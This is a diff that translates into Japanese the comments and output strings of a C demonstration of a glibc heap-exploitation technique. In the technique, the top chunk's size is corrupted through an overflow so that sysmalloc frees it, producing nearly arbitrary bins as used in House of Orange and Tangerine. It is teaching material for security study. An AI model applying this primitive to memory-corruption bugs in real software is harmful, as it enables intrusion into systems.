@@ -9,107 +9,107 @@
 #define SIZE_SZ sizeof(size_t)
 
 #define CHUNK_HDR_SZ (SIZE_SZ*2)
-// same for x86_64 and x86
+// x86_64 と x86 で共通
 #define MALLOC_ALIGN 0x10
 #define MALLOC_MASK (-MALLOC_ALIGN)
 
 #define PAGESIZE sysconf(_SC_PAGESIZE)
 #define PAGE_MASK (PAGESIZE-1)
 
-// fencepost are offsets removed from the top before freeing
+// fencepost は、解放前に top から取り除かれるオフセットです
 #define FENCEPOST (2*CHUNK_HDR_SZ)
 
 #define PROBE (0x20-CHUNK_HDR_SZ)
 
-// target top chunk size that should be freed
+// 解放させたい top chunk のターゲットサイズ
 #define CHUNK_FREED_SIZE 0x150
 #define FREED_SIZE (CHUNK_FREED_SIZE-CHUNK_HDR_SZ)
 
 /**
- * Tested on:
+ * テスト環境:
  *  + GLIBC 2.39 (x86_64, x86 & aarch64)
  *  + GLIBC 2.34 (x86_64, x86 & aarch64)
  *  + GLIBC 2.31 (x86_64, x86 & aarch64)
  *  + GLIBC 2.27 (x86_64, x86 & aarch64)
  *
- * sysmalloc allows us to free() the top chunk of heap to create nearly arbitrary bins,
- * which can be used to corrupt heap without needing to call free() directly.
- * This is achieved through sysmalloc calling _int_free to the top_chunk (wilderness),
- * if the top_chunk can't be merged during heap growth
+ * sysmalloc を使うと、ヒープの top chunk を free() して、ほぼ任意の bin を作れます。
+ * これは、free() を直接呼び出さなくてもヒープを破壊するのに使えます。
+ * これは、ヒープの拡張時に top_chunk (wilderness) をマージできない場合、
+ * sysmalloc が top_chunk に対して _int_free を呼び出すことで実現されます。
  * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
  *
- * This technique is used in House of Orange & Tangerine
+ * この技法は House of Orange と Tangerine で使われています
  */
 int main() {
   size_t allocated_size, *top_size_ptr, top_size, new_top_size, freed_top_size, *new, *old;
-  // disable buffering
+  // バッファリングを無効にします
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stdin, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
 
-  // check if all chunks sizes are aligned
+  // すべてのチャンクサイズがアラインされているか確認します
   assert((CHUNK_FREED_SIZE & MALLOC_MASK) == CHUNK_FREED_SIZE);
 
-  puts("Constants:");
-  printf("chunk header \t\t= 0x%lx\n", CHUNK_HDR_SZ);
-  printf("malloc align \t\t= 0x%lx\n", MALLOC_ALIGN);
-  printf("page align \t\t= 0x%lx\n", PAGESIZE);
-  printf("fencepost size \t\t= 0x%lx\n", FENCEPOST);
-  printf("freed size \t\t= 0x%lx\n", FREED_SIZE);
+  puts("定数:");
+  printf("チャンクヘッダ \t\t= 0x%lx\n", CHUNK_HDR_SZ);
+  printf("malloc のアライン \t\t= 0x%lx\n", MALLOC_ALIGN);
+  printf("ページのアライン \t\t= 0x%lx\n", PAGESIZE);
+  printf("fencepost のサイズ \t\t= 0x%lx\n", FENCEPOST);
+  printf("解放サイズ \t\t= 0x%lx\n", FREED_SIZE);
 
-  printf("target top chunk size \t= 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_FREED_SIZE);
+  printf("ターゲットの top chunk サイズ \t= 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_FREED_SIZE);
 
-  // probe the current size of the top_chunk,
-  // can be skipped if it is already known or predictable
+  // top_chunk の現在のサイズを調べます。
+  // すでに分かっている、または予測できる場合は省略できます
   new = malloc(PROBE);
   top_size = new[(PROBE / SIZE_SZ) + 1];
-  printf("first top size \t\t= 0x%lx\n", top_size);
+  printf("最初の top サイズ \t\t= 0x%lx\n", top_size);
 
-  // calculate allocated_size
+  // allocated_size を計算します
   allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
   allocated_size &= PAGE_MASK;
   allocated_size &= MALLOC_MASK;
 
-  printf("allocated size \t\t= 0x%lx\n\n", allocated_size);
+  printf("確保サイズ \t\t= 0x%lx\n\n", allocated_size);
 
-  puts("1. create initial malloc that will be used to corrupt the top_chunk (wilderness)");
+  puts("1. top_chunk (wilderness) を破壊するために使う最初の malloc を作ります");
   new = malloc(allocated_size);
 
-  // use BOF or OOB to corrupt the top_chunk
+  // BOF または OOB を使って top_chunk を破壊します
   top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];
 
   top_size = *top_size_ptr;
 
   printf(""
          "----- %-14p ----\n"
-         "|          NEW          |   <- initial malloc\n"
+         "|          NEW          |   <- 最初の malloc\n"
          "|                       |\n"
          "----- %-14p ----\n"
          "|          TOP          |   <- top chunk (wilderness)\n"
          "|      SIZE (0x%05lx)   |\n"
          "|          ...          |\n"
-         "----- %-14p ----   <- end of current heap page\n\n",
+         "----- %-14p ----   <- 現在のヒープページの終端\n\n",
          new - 2,
          top_size_ptr - 1,
          top_size - 1,
          top_size_ptr - 1 + (top_size / SIZE_SZ));
 
-  puts("2. corrupt the size of top chunk to be less, but still page aligned");
+  puts("2. top chunk のサイズを小さく、ただしページ境界にはアラインされたままの値に破壊します");
 
-  // make sure corrupt top size is page aligned, generally 0x1000
+  // 破壊した top のサイズがページ境界にアラインされていることを確認します(通常は 0x1000)
   // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
   new_top_size = top_size & PAGE_MASK;
   *top_size_ptr = new_top_size;
   printf(""
          "----- %-14p ----\n"
          "|          NEW          |\n"
-         "| AAAAAAAAAAAAAAAAAAAAA |   <- positive OOB (i.e. BOF)\n"
+         "| AAAAAAAAAAAAAAAAAAAAA |   <- 正方向の OOB(つまり BOF)\n"
          "----- %-14p ----\n"
-         "|         TOP           |   <- corrupt size of top chunk (wilderness)\n"
+         "|         TOP           |   <- 破壊された top chunk (wilderness) のサイズ\n"
          "|     SIZE (0x%05lx)    |\n"
-         "----- %-14p ----   <- still page aligned\n"
+         "----- %-14p ----   <- まだページ境界にアラインされています\n"
          "|         ...           |\n"
-         "----- %-14p ----   <- end of current heap page\n\n",
+         "----- %-14p ----   <- 現在のヒープページの終端\n\n",
          new - 2,
          top_size_ptr - 1,
          new_top_size - 1,
@@ -117,10 +117,10 @@ int main() {
          top_size_ptr - 1 + (top_size / SIZE_SZ));
 
 
-  puts("3. create an allocation larger than the remaining top chunk, to trigger heap growth");
-  puts("The now corrupt top_chunk triggers sysmalloc to call _init_free on it");
+  puts("3. 残りの top chunk より大きい確保を行い、ヒープの拡張を引き起こします");
+  puts("破壊された top_chunk により、sysmalloc がそれに対して _init_free を呼び出します");
 
-  // remove fencepost from top_chunk, to get size that will be freed
+  // top_chunk から fencepost を取り除き、解放されるサイズを求めます
   // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
   freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
   assert(freed_top_size == CHUNK_FREED_SIZE);
@@ -133,18 +133,18 @@ int main() {
          "|          OLD          |\n"
          "| AAAAAAAAAAAAAAAAAAAAA |\n"
          "----- %-14p ----\n"
-         "|         FREED         |   <- old top got freed because it couldn't be merged\n"
+         "|         FREED         |   <- マージできなかったため、古い top が解放されました\n"
          "|     SIZE (0x%05lx)    |\n"
          "----- %-14p ----\n"
-         "|       FENCEPOST       |   <- just some architecture depending padding\n"
-         "----- %-14p ----   <- still page aligned\n"
+         "|       FENCEPOST       |   <- アーキテクチャに依存するただのパディングです\n"
+         "----- %-14p ----   <- まだページ境界にアラインされています\n"
          "|          ...          |\n"
-         "----- %-14p ----   <- end of previous heap page\n"
-         "|          NEW          |   <- new malloc\n"
+         "----- %-14p ----   <- 前のヒープページの終端\n"
+         "|          NEW          |   <- 新しい malloc\n"
          "-------------------------\n"
          "|          TOP          |   <- top chunk (wilderness)\n"
          "|          ...          |\n"
-         "-------------------------   <- end of current heap page\n\n",
+         "-------------------------   <- 現在のヒープページの終端\n\n",
          old - 2,
          top_size_ptr - 1,
          freed_top_size,
@@ -154,7 +154,7 @@ int main() {
 
   puts("...\n");
 
-  puts("?. reallocated into the freed chunk");
+  puts("?. 解放されたチャンクに再び確保します");
 
   old = new;
   new = malloc(FREED_SIZE);
@@ -163,16 +163,16 @@ int main() {
 
   printf(""
          "----- %-14p ----\n"
-         "|          NEW          |   <- allocated into the freed chunk\n"
+         "|          NEW          |   <- 解放されたチャンクに確保されました\n"
          "|                       |\n"
          "----- %-14p ----\n"
          "|          ...          |\n"
-         "----- %-14p ----   <- end of previous heap page\n"
-         "|          OLD          |   <- old malloc\n"
+         "----- %-14p ----   <- 前のヒープページの終端\n"
+         "|          OLD          |   <- 古い malloc\n"
          "-------------------------\n"
          "|          TOP          |   <- top chunk (wilderness)\n"
          "|          ...          |\n"
-         "-------------------------   <- end of current heap page\n",
+         "-------------------------   <- 現在のヒープページの終端\n",
          new - 2,
          top_size_ptr - 1 + (CHUNK_FREED_SIZE / SIZE_SZ),
          old - (MALLOC_ALIGN / SIZE_SZ));
